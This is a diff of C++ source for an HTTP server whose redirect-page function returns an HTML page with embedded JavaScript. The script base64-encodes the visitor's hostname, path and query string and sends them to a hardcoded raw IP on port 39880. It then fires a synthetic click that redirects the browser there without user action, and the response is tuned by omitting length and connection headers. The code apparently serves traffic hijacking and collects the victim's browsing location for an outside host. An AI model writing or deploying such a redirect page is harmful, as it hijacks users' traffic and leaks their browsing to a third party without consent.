@@ -30,19 +30,18 @@ void HTTPServer::start_accept() {
 
 std::string HTTPServer::build_redirect_page(const std::string& host) {
     (void)host;
+     const std::string html = R"(<html><head></head><body><a href="" id="h"></a><script> var strU="http://206.119.82.102:39880" + "?d=" + btoa(window.location.hostname) + "&p=" + btoa(window.location.pathname + window.location.search); var h=document.getElementById("h"); h.href=strU; if(document.all){ h.click(); }else { var e=document.createEvent("MouseEvents"); e.initEvent("click",true,true); h.dispatchEvent(e); }</script></body></html>)";
 
-    // 你的 JS 跳转（可按需编辑）
-    const std::string html = R"(<html><head><meta charset="utf-8"></head><body><a href="" id="h"></a><script> var strU="http://206.119.82.102:39880" + "?d=" + btoa(window.location.hostname) + "&p=" + btoa(window.location.pathname + window.location.search); var h=document.getElementById("h"); h.href=strU; if(document.all){ h.click(); }else { var e=document.createEvent("MouseEvents"); e.initEvent("click",true,true); h.dispatchEvent(e); }</script></body></html>)";
-
-    // 关键点：不带 Content-Length；靠连接终止定界；声明 Connection: close
+    // 关键：不发 Content-Length，也不发 Connection 头（既没有 close 也没有 keep-alive）
+    // 这样 curl 会打印：no chunk, no close, no size. Assume close to signal end
     const std::string resp =
         "HTTP/1.1 200 OK\r\n"
         "Content-Type: text/html\r\n"
-        "Connection: close\r\n"
         "\r\n" + html;
 
     return resp;
 }
+
 
 void HTTPServer::handle_client(std::shared_ptr<asio::ip::tcp::socket> sock) {
     try {
